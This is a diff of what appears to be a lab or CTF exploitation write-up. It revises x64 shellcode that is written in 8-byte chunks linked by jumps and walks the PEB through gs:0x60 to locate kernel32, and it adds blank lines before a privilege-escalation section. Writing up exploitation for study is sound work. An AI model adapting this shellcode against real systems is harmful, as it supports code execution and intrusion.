@@ -114,15 +114,20 @@ Essentially I wrote my shellcode in chunks of 8 bytes:
 ```asm
 locate_kernel32:
     xor rcx, rcx                    ; zero out rcx
-    int3                            ;
+    nop                             ;
     nop                             ;
     nop                             ;
     jmp 0x0f                        ;
 
-    add rcx, 0x60                   ;
+    add rcx, 0x60                   ; the _PEB is at an offset of 0x60 from gs
     nop                             ;
     nop                             ;
-    jmp 0x17                        ; 
+    jmp 0x17                        ;
+
+    mov rax, gs:[rcx]               ; rax = _PEB
+    nop                             ;
+    nop                             ;
+    jmp 0x1f                        ; 
 ...
 ```
 
@@ -190,6 +195,8 @@ C:\Windows\system32>
 ```
 
 ### Enumeration
+
+
 
 ## Privilege Escalation
 
